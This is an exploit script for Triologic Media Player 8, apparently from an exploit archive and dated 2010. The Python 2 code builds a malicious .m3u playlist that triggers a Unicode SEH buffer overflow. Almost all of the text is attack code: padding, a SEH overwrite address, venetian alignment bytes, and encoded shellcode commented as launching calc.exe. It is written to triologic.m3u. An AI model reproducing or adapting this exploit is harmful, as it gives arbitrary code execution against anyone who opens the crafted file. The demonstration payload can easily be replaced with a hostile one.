# Exploit Title: Triologic Media Player 8 (.m3u) Local Universal Unicode Buffer Overflow [SEH]
# Date: August 17, 2010
# Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
# Software Link: http://download.cnet.com/Triologic-Media-Player/3000-2139_4-10691520.html
# Version: 8
# Tested on: Windows XP SP3 En
# Thanks: muts, ishtus
# Greetz: Astalavista, OffSEC, Exploit-DB

buffer = "\x41" * 536	 # buffer
buffer += "\x61\x41" 	 # popad + nop/align
buffer += "\xF2\x41" 	 # pop,pop,retn triomp8.exe unicode (universal)
buffer += "\x90"	 # 
buffer += "\x6e" 	 # venetian shellcode
buffer += "\x05\x37\x13" # add eax, 0x13003700
buffer += "\x6e" 	 # venetian shellcode
buffer += "\x2d\x36\x13" # sub eax, 0x13003600
buffer += "\x6e" 	 # venetian shellcode
buffer += "\x50" 	 # push eax
buffer += "\x6e" 	 # venetian shellcode
buffer += "\xc3" 	 # ret
buffer += "\x90" * 111   # align to shellcode
# windows\exec calc.exe unicode uppercase shellcode
buffer += ("PPYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAP"
"AZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB3Y9R8Z9L8Y2RJT1N0V0Y0I0I0I0I0"
"I0I0I0I0I0I0C0C0C0C0C0C070Q0Z1Z110X0P001100112K11110Q02110B020B0B000B0B110B0X0P0"
"8110B2U0J0I0I2L0M080N1Y0E0P0G2P0C000Q2P0K090K0U0E1Q0H0R0B0D0L0K0B2R0P000L0K0F020"
"F2L0L0K0C1R0G1T0N2K0Q1R0D1X0D0O0L2W0C2Z0E2V0E1Q0I2O0F0Q0K2P0L2L0E2L0Q2Q0C0L0E0R0"
"D2L0G0P0O010J2O0D0M0G2Q0K2W0I2R0H2P0P0R0C1W0N2K0B2R0B000L0K0P0B0G0L0G2Q0H0P0N2K0"
"C2P0Q1X0K050K2P0P2T0Q0Z0E0Q0H0P0B2P0N2K0C2X0F2X0L0K0B2X0E2P0E0Q0N030I2S0G0L0P0I0"
"N2K0G0D0N2K0F1Q0I0F0P010I2O0E1Q0O000L2L0J1Q0H0O0F2M0C010O070G0H0K0P0B0U0L040E0S0"
"C0M0K0H0E2K0Q2M0Q040P2U0K0R0P0X0N2K0F080G0T0C010I0C0E060N2K0F2L0B2K0N2K0B2X0G2L0"
"C010K1S0N2K0G2T0L0K0C010H0P0L0I0Q0T0D1T0E2T0C2K0C2K0P1Q0B2Y0P0Z0P0Q0I2O0K0P0C1X0"
"C2O0C1Z0N2K0F2R0H2K0L0F0C2M0B0J0E0Q0N2M0N1U0O0I0G2P0C000E0P0B2P0Q2X0P010N2K0P2O0"
"O2W0K0O0J2U0M2K0J0P0N0U0I020F060E080N0F0L0U0O0M0M0M0K0O0I0E0E2L0F1V0Q2L0F1Z0M0P0"
"K0K0M000Q1U0G2U0O0K0P0G0D0S0Q1R0P2O0P1Z0C000Q0C0K0O0J2U0E030C0Q0P2L0E030D2N0B0E0"
"D080Q2U0C000E0Z1111KPA")
buffer += "\x90" * (5000 - len(buffer))

try:
    print "[+] Creating exploit file.."
    exploit = open('triologic.m3u','w');
    exploit.write(buffer);
    exploit.close();
    print "[+] Writing", len(buffer), "bytes to triologic.m3u"
    print "[+] Exploit file created!"
except:
    print "[-] Error: You do not have correct permissions.."

